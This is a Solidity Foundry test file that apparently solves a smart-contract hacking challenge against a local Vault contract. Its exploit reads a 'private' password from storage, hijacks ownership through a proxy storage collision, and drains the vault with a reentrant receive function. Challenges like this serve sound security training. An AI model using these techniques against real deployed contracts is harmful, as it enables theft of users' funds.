// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import {Test, console} from "forge-std/Test.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(this);
    bool ishack = false;
    event Received(address Sender, uint Value);

    // 接收ETH时释放Received事件
    receive() external payable {
        emit Received(msg.sender, msg.value);
        if (ishack == false) {
            ishack = true;
            vault.withdraw();
        }
    }

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        bytes32 password = vm.load(
            address(vault),
            0x0000000000000000000000000000000000000000000000000000000000000001
        );
        console.logBytes32(password);
        vault.deposite{value: 0.1 ether}();

        VaultLogic(address(vault)).changeOwner(password, palyer);
        vault.openWithdraw();
        vault.withdraw();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
